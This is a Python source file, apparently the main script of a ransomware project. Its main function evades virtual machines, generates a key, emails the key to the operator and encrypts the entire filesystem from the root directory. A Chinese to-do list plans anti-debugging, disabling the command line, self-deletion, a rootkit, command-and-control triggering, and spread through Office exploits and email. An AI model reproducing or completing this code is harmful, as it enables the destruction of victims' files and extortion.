# coding:utf-8
from __future__ import print_function
import os,random,string,struct,sys,smtplib,time

from data.basedata import *
from lib.un_vm import un_vm
from lib.en_decrypt import gen_key,Encrypt
from lib.gen_email import send_email
'''
todo:
对系统中python核心文件保护，即不删除不加密
###通过smtp将加密key发送到qq邮箱
#增加对虚拟机环境的识别，见anti_vm.py文件
#增加对调试器环境的判断，见anti_debugger.py文件
#增加禁用命令行等的功能，见deathransom的第35行disable_all()函数
#增加运行完毕删除自身的功能，见deathransom的第74行
DONE:
TAG:
TODO:
NOTE:
FIXME:
TODO：实现SSL/TLS传输
TODO：实现非对称密码保护对称密钥再发送给控制台的功能
###增加操作系统识别功能，针对不同的系统，开机自启、禁用命令行都有不同的操作手法
守护进程
不立刻爆发，潜伏期，中心段下发加密指令，去中心化
office漏洞，邮件传播
插入病毒下载代码
rootkit实现
'''

def note():
    '''打印logo'''
    print(title);

def main():
    _key=''
    un_vm()
    _key=gen_key()
    send_email(_key)
    Encrypt(_key,'/')



""" def main():
    check_os();
    un_vm();
    if len(sys.argv) == 1:
        note();
    elif len(sys.argv) == 2:
        if sys.argv[1]=='en':
            Encrypt(jijue_key);
            if os_system=='windows':
                disable_win_cmd();
        if sys.argv[1]=='de':
            Decrypt(jijue_key)
        if sys.argv[1] =='email':
            send_email()
    elif len(sys.argv) == 3:
        if sys.argv[1] == 'de' and len(sys.argv[2])==16:
            de_key=sys.argv[2]
            Decrypt(de_key)
        if sys.argv[1] == 'en' and sys.argv[2] == 'gen':
            en_key=gen_key();
            Encrypt(en_key)
    else :
        note();
 """



if __name__ == "__main__":
	main()

